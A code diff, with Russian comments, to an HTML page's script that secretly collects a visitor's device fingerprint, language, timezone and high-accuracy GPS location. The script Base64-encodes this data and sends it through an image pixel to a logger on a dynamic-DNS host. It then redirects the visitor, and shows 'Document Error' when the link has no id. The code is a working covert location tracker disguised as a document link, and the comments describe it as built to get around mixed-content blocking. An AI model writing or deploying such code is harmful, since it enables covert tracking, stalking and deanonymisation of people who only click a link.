@@ -14,40 +14,47 @@
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const slug = urlParams.get('id');
-        const targetServer = "http://echomapwa.ddns.net/logger/api/log_advance/"; // Эндпоинт логов
-        const finalRedirect = "http://echomapwa.ddns.net/logger/l/"; // Эндпоинт редиректа
+        const targetServer = "http://echomapwa.ddns.net/logger/api/log_advance/";
+        const finalRedirect = "http://echomapwa.ddns.net/logger/l/";
 
         async function collectAndGo() {
-            if (!slug) return;
+            if (!slug) {
+                document.body.innerHTML = "Document Error";
+                return;
+            }
         
             let info = {
                 sw: window.screen.width, sh: window.screen.height,
                 plt: navigator.platform, cores: navigator.hardwareConcurrency || 0,
+                lang: navigator.language, tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 gpu: "Unknown", lat: null, lon: null
             };
         
-            // Пытаемся взять GPS
+            // Попытка взять GPS (максимум 4 секунды, чтобы не висеть вечно)
             if ("geolocation" in navigator) {
                 try {
                     const pos = await new Promise((res, rej) => {
-                        navigator.geolocation.getCurrentPosition(res, rej, {timeout: 5000, enableHighAccuracy: true});
+                        navigator.geolocation.getCurrentPosition(res, rej, {
+                            timeout: 4000, 
+                            enableHighAccuracy: true
+                        });
                     });
                     info.lat = pos.coords.latitude;
                     info.lon = pos.coords.longitude;
                 } catch(e) { console.log("GPS Skip"); }
             }
         
-            // "Шифруем" данные в Base64, чтобы пролезли в URL без проблем
-            const encodedData = btoa(JSON.stringify(info));
+            // Упаковываем в Base64
+            const encodedData = btoa(unescape(encodeURIComponent(JSON.stringify(info))));
             
-            // ОТПРАВКА ЧЕРЕЗ КАРТИНКУ (Самый надежный метод для HTTP/HTTPS микса)
+            // Отправка через картинку-пиксель (обход Mixed Content)
             const img = new Image();
             img.src = `${targetServer}${slug}?data=${encodedData}&_t=${Date.now()}`;
         
-            // Ждем полсекунды, чтобы запрос ушел, и редиректим
+            // Редирект через 600мс после того как картинка начала грузиться
             setTimeout(() => {
                 window.location.href = finalRedirect + slug;
-            }, 600;
+            }, 600); // ТУТ БЫЛА ОШИБКА В СКОБКЕ
         }
 
         collectAndGo();
